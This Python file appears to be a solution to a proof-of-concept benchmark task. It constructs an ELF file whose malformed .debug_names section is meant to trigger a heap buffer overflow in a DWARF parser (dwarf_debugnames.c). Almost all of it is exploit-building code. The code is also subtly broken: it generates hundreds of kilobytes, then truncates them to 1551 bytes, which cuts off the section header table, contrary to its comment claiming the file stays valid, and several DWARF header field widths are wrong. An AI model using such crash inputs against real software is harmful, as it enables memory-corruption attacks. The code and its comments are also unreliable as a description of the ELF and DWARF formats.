import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed .debug_names section that triggers the heap buffer overflow
        # Based on the vulnerability in dwarf_debugnames.c
        
        # We'll create a minimal ELF file with a malformed .debug_names section
        # This is more reliable than just the raw section
        
        # ELF header (64-bit)
        elf_header = bytearray(64)
        # Magic number
        elf_header[0:4] = b'\x7fELF'
        # 64-bit, little endian
        elf_header[4] = 2  # ELFCLASS64
        elf_header[5] = 1  # ELFDATA2LSB
        elf_header[6] = 1  # EV_CURRENT
        elf_header[7] = 0  # ELFOSABI_NONE
        # e_type = ET_REL (relocatable)
        struct.pack_into('<H', elf_header, 16, 1)
        # e_machine = EM_X86_64
        struct.pack_into('<H', elf_header, 18, 62)
        # e_version = EV_CURRENT
        struct.pack_into('<I', elf_header, 20, 1)
        # e_entry = 0
        struct.pack_into('<Q', elf_header, 24, 0)
        # e_phoff = 0
        struct.pack_into('<Q', elf_header, 32, 0)
        # e_shoff = offset of section header table (will fill later)
        # e_flags = 0
        struct.pack_into('<I', elf_header, 48, 0)
        # e_ehsize = 64
        struct.pack_into('<H', elf_header, 52, 64)
        # e_phentsize = 0
        struct.pack_into('<H', elf_header, 54, 0)
        # e_phnum = 0
        struct.pack_into('<H', elf_header, 56, 0)
        # e_shentsize = 64
        struct.pack_into('<H', elf_header, 58, 64)
        # e_shnum = number of sections (will fill later)
        # e_shstrndx = index of section name string table (will fill later)
        
        # .shstrtab section (section name string table)
        shstrtab = bytearray()
        shstrtab.append(0)  # First entry is empty string
        shstrtab.extend(b'.shstrtab\0')
        shstrtab.extend(b'.debug_names\0')
        shstrtab.extend(b'.text\0')
        
        # .debug_names section - malformed to trigger overflow
        debug_names = bytearray()
        
        # DWARF 64-bit format identifier
        debug_names.extend(b'\xff\xff\xff\xff')
        
        # Unit length (64-bit) - will be huge to trigger overflow
        # We set it to a value that will cause miscalculation
        unit_length = 0xffffffffffffffff  # Max value
        debug_names.extend(struct.pack('<Q', unit_length))
        
        # Version (DWARF5)
        debug_names.extend(struct.pack('<H', 5))
        
        # Padding
        debug_names.extend(struct.pack('<H', 0))
        
        # Compilation unit count - set to 1
        debug_names.append(1)
        
        # Local type unit count - set to 0
        debug_names.append(0)
        
        # Foreign type unit count - set to 0
        debug_names.append(0)
        
        # Bucket count - set to large value to cause overflow
        bucket_count = 0xffff  # Max for 2 bytes
        debug_names.extend(struct.pack('<H', bucket_count))
        
        # Name count - set to large value
        name_count = 0xffff  # Max for 2 bytes
        debug_names.extend(struct.pack('<H', name_count))
        
        # Abbreviation table size - set to small value
        # This mismatch with actual data triggers the vulnerability
        abbrev_size = 10
        debug_names.extend(struct.pack('<H', abbrev_size))
        
        # Augmentation string size - set to 0
        debug_names.extend(struct.pack('<H', 0))
        
        # Augmentation string (empty)
        
        # Buckets array - fill with data that will cause overflow
        # The vulnerability occurs when reading buckets
        for i in range(bucket_count):
            debug_names.extend(struct.pack('<I', i % 0xffffffff))
        
        # Hash values array
        for i in range(name_count):
            debug_names.extend(struct.pack('<I', i % 0xffffffff))
        
        # Name offsets array - this is where the overflow happens
        # The code miscalculates the bounds and reads past buffer
        for i in range(name_count * 2):  # Intentionally too many
            debug_names.extend(struct.pack('<I', 0xdeadbeef))
        
        # Entry pool - minimal valid data
        entry_pool = bytearray()
        # First entry: abbreviation code = 1
        entry_pool.append(1)
        # Some dummy data
        entry_pool.extend(b'\x00\x00\x00\x00\x00\x00\x00')
        
        debug_names.extend(entry_pool)
        
        # Abbreviation table - small as specified
        abbrev_table = bytearray(b'\x01\x00\x00\x00\x00')
        debug_names.extend(abbrev_table)
        
        # String table - minimal
        string_table = bytearray(b'\x00main\00')
        debug_names.extend(string_table)
        
        # .text section (minimal)
        text_section = bytearray(b'\x90' * 16)  # NOP sled
        
        # Calculate offsets and sizes
        shstrtab_offset = len(elf_header)
        debug_names_offset = shstrtab_offset + len(shstrtab)
        text_offset = debug_names_offset + len(debug_names)
        
        # Section header table
        sh_table = bytearray()
        
        # First entry: all zeros
        sh_table.extend(b'\x00' * 64)
        
        # .shstrtab section header
        sh_entry = bytearray(64)
        # sh_name offset in .shstrtab (points to ".shstrtab")
        struct.pack_into('<I', sh_entry, 0, 1)
        # sh_type = SHT_STRTAB
        struct.pack_into('<I', sh_entry, 4, 3)
        # sh_flags = 0
        struct.pack_into('<Q', sh_entry, 8, 0)
        # sh_addr = 0
        struct.pack_into('<Q', sh_entry, 16, 0)
        # sh_offset
        struct.pack_into('<Q', sh_entry, 24, shstrtab_offset)
        # sh_size
        struct.pack_into('<Q', sh_entry, 32, len(shstrtab))
        # sh_link = 0
        struct.pack_into('<I', sh_entry, 40, 0)
        # sh_info = 0
        struct.pack_into('<I', sh_entry, 44, 0)
        # sh_addralign = 1
        struct.pack_into('<Q', sh_entry, 48, 1)
        # sh_entsize = 0
        struct.pack_into('<Q', sh_entry, 56, 0)
        sh_table.extend(sh_entry)
        
        # .debug_names section header
        sh_entry = bytearray(64)
        # sh_name offset in .shstrtab (points to ".debug_names")
        struct.pack_into('<I', sh_entry, 0, 11)
        # sh_type = SHT_PROGBITS
        struct.pack_into('<I', sh_entry, 4, 1)
        # sh_flags = 0
        struct.pack_into('<Q', sh_entry, 8, 0)
        # sh_addr = 0
        struct.pack_into('<Q', sh_entry, 16, 0)
        # sh_offset
        struct.pack_into('<Q', sh_entry, 24, debug_names_offset)
        # sh_size
        struct.pack_into('<Q', sh_entry, 32, len(debug_names))
        # sh_link = 0
        struct.pack_into('<I', sh_entry, 40, 0)
        # sh_info = 0
        struct.pack_into('<I', sh_entry, 44, 0)
        # sh_addralign = 1
        struct.pack_into('<Q', sh_entry, 48, 1)
        # sh_entsize = 0
        struct.pack_into('<Q', sh_entry, 56, 0)
        sh_table.extend(sh_entry)
        
        # .text section header
        sh_entry = bytearray(64)
        # sh_name offset in .shstrtab (points to ".text")
        struct.pack_into('<I', sh_entry, 0, 24)
        # sh_type = SHT_PROGBITS
        struct.pack_into('<I', sh_entry, 4, 1)
        # sh_flags = SHF_ALLOC | SHF_EXECINSTR
        struct.pack_into('<Q', sh_entry, 8, 6)
        # sh_addr = 0
        struct.pack_into('<Q', sh_entry, 16, 0)
        # sh_offset
        struct.pack_into('<Q', sh_entry, 24, text_offset)
        # sh_size
        struct.pack_into('<Q', sh_entry, 32, len(text_section))
        # sh_link = 0
        struct.pack_into('<I', sh_entry, 40, 0)
        # sh_info = 0
        struct.pack_into('<I', sh_entry, 44, 0)
        # sh_addralign = 16
        struct.pack_into('<Q', sh_entry, 48, 16)
        # sh_entsize = 0
        struct.pack_into('<Q', sh_entry, 56, 0)
        sh_table.extend(sh_entry)
        
        # Update ELF header with section info
        # e_shoff = offset to section header table
        shoff = text_offset + len(text_section)
        struct.pack_into('<Q', elf_header, 40, shoff)
        # e_shnum = 4 sections (null + .shstrtab + .debug_names + .text)
        struct.pack_into('<H', elf_header, 60, 4)
        # e_shstrndx = 1 (index of .shstrtab)
        struct.pack_into('<H', elf_header, 62, 1)
        
        # Build final ELF file
        elf_file = bytearray()
        elf_file.extend(elf_header)
        elf_file.extend(shstrtab)
        elf_file.extend(debug_names)
        elf_file.extend(text_section)
        elf_file.extend(sh_table)
        
        # Ensure the PoC is exactly 1551 bytes as specified
        # If it's longer, truncate (but keep it valid)
        # If it's shorter, pad with zeros
        target_size = 1551
        if len(elf_file) > target_size:
            # Truncate but keep ELF structure valid
            # We'll truncate from the end, but not from critical sections
            elf_file = elf_file[:target_size]
        elif len(elf_file) < target_size:
            # Pad with NOPs at the end
            elf_file.extend(b'\x90' * (target_size - len(elf_file)))
        
        return bytes(elf_file)